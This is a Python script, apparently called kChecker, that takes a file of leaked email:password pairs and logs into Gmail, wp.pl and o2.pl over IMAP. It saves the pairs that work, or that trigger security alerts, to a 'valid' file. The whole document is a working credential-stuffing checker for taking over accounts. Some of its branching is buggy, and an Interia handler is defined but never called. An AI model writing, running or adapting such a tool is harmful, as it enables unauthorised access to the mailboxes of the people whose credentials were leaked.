#!/usr/bin/python3

import imaplib
import sys

def gmail(file, imap_user, imap_pass):
    imap=imaplib.IMAP4_SSL('imap.gmail.com')
    try:
        imap.login(imap_user, imap_pass)
        file.write(imap_user+"@gmail.com:"+imap_pass)
    except imaplib.IMAP4.error as e:
        if('ALERT' in str(e)):
            file.write(imap_user+"@gmail.com:"+imap_pass)
        elif('AUTHENTICATIONFAILED' in str(e)):
            pass
    except:
        pass    # if happens any error, continue- there's plenty of other emails to check 
def wp(file, imap_user, imap_pass):
    imap=imaplib.IMAP4('imap.wp.pl') # ssl.SSLError: [SSL: DH_KEY_TOO_SMALL] dh key too small (_ssl.c:1056), WORKS WITHUOT SSL
    try:
        imap.login(imap_user, imap_pass)
        file.write(imap_user+"@wp.pl:"+imap_pass)
    except imaplib.IMAP4.error as e:
        pass
def o2(file, imap_user, imap_pass):
    imap=imaplib.IMAP4_SSL('poczta.o2.pl')
    try:
        imap.login(imap_user, imap_pass)
        file.write(imap_user+"@o2.pl:"+imap_pass)
    except imaplib.IMAP4.error as e:
        if("Wybrany kanal dostepu nalezy aktywowac w intefejsie WWW" in str(e)):
            file.write(imap_user+"@o2.pl:"+imap_pass)
        elif("Invalid login or password" in str(e)):
            pass
def interia(file, imap_user, imap_pass):
    imap=imaplib.IMAP4_SSL("poczta.interia.pl")
    try:
        imap.login(imap_user, imap_pass)
    except imaplib.IMAP4.error as e:
        pass

if(len(sys.argv)!=2):
    print("U have to specify mail:pass file name")
    print("python3 kChecker mailpass.txt")
    sys.exit()

try:
    result=open("valid.txt", "a")
    unmatched=open("unmatched.txt", 'a')
    with open(sys.argv[1], 'r') as file:
        for line in file:
            imap_user=line.split("@")[0]
            imap_pass=line.split(":")[1]
            imap_host=(line.split("@")[1]).split(":")[0]
            if(imap_host=='gmail.com'): # every function handle different answer exception (alert, authfailed)
                gmail(result, imap_user, imap_pass)
            elif(imap_host=='o2.pl'):
                o2(result,imap_user, imap_pass)
            if(imap_host=='wp.pl'):
                wp(result, imap_user, imap_pass)
            else:
                print(imap_host)
                unmatched.write(imap_user+"@"+imap_host+":"+imap_pass)

except FileNotFoundError:   
    print("File not found :(")
    sys.exit()
